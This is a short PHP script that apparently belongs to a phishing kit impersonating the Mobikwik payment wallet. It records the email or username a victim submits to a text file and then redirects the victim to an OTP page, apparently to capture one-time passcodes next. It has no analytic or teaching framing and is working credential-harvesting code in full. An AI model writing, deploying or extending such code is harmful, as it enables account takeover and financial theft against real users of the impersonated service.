<?php

file_put_contents("usernames.txt", "Mobikwik Username" . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
